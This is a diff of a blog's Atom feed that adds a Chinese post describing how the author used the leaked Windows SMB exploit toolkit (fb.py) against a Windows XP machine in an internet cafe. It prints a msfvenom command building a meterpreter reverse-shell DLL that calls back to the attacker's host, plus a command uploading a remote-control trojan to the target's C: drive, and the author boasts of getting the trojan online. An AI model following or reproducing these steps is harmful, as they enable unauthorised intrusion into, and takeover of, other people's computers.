@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://loid.online/"/>
-  <updated>2017-04-10T20:17:07.066Z</updated>
+  <updated>2017-04-15T15:49:26.938Z</updated>
   <id>http://loid.online/</id>
   
   <author>
@@ -14,6 +14,66 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>hack Net bar by Windows smb</title>
+    <link href="http://loid.online/2017/04/15/hack-Net-bar-by-Windows-smb/"/>
+    <id>http://loid.online/2017/04/15/hack-Net-bar-by-Windows-smb/</id>
+    <published>2017-04-15T15:39:11.000Z</published>
+    <updated>2017-04-15T15:49:26.938Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="这才是日网吧的正确姿势"><a href="#这才是日网吧的正确姿势" class="headerlink" title="这才是日网吧的正确姿势!"></a>这才是日网吧的正确姿势!</h3><hr>
+<blockquote>
+<p>来被 Windows SMB 远程溢出的0day 闹了群.早上有事,晚上到了网吧复现了下.</p>
+</blockquote>
+<ul>
+<li><p>如何安装所需环境,可以看看Luan表哥的复现,很详细.有几点需要注意的：</p>
+<ul>
+<li>Luan’s Blog: <a href="http://lu4n.com/" target="_blank" rel="external">http://lu4n.com/</a></li>
+<li>上面博客经给出了Python26 和 pywin32 64位的</li>
+<li>注意,上面博客具是适合64位系统用的. </li>
+<li>上面博客中有一个修改fb.py 的步骤,千万不要忘记</li>
+</ul>
+</li>
+<li><p>好戏开始</p>
+<ul>
+<li><p>因为我的目标机是32位的Windows XP 所以这里开始再演示一遍,如果目标机是64位的,可以跳过这里。</p>
+</li>
+<li><p>用msf生成dll,并填写在fb里.</p>
+<pre><code>本机IP: 192.168.1.25
+目标IP: 192.168.1.201
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.25 LPORT=6666 -f dll &gt; msf.dll
+</code></pre><p>  <img src="/images/1_bar.png" alt="netbar 01"></p>
+</li>
+<li><p>上面的设置好后,暂时不要开始攻击,现在开始配置msf.<br>  <img src="/images/2_bar.png" alt="netbar 02"></p>
+</li>
+<li><p>先开始用msf,等待回话连接.然后开始用fb攻击,得到一个回话.<br>  <img src="/images/3_bar.png" alt="netbar 03"></p>
+</li>
+<li><p>生成一个远控马,然后用upload 上传本地的远控马,到主机的C:盘根目录</p>
+<pre><code>upload C:\\Users\\Administrator\\Desktop\\stranded\\s.exe c:\\\
+</code></pre><p>  <img src="/images/4_bar.png" alt="netbar 04"></p>
+</li>
+<li><p>进入shell,运行上传过去的远控马.<br>  <img src="/images/5_bar.png" alt="netbar 05"></p>
+</li>
+<li><p>然后远控上线,嘿嘿嘿.<br>  <img src="/images/6_bar.png" alt="netbar 06"></p>
+</li>
+</ul>
+</li>
+<li><p>最后的全家福<br>  <img src="/images/7_bar.png" alt="netbar 07"> </p>
+</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;这才是日网吧的正确姿势&quot;&gt;&lt;a href=&quot;#这才是日网吧的正确姿势&quot; class=&quot;headerlink&quot; title=&quot;这才是日网吧的正确姿势!&quot;&gt;&lt;/a&gt;这才是日网吧的正确姿势!&lt;/h3&gt;&lt;hr&gt;
+&lt;blockquote&gt;
+&lt;p&gt;来被 Windows SMB
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>SQL Injection Study</title>
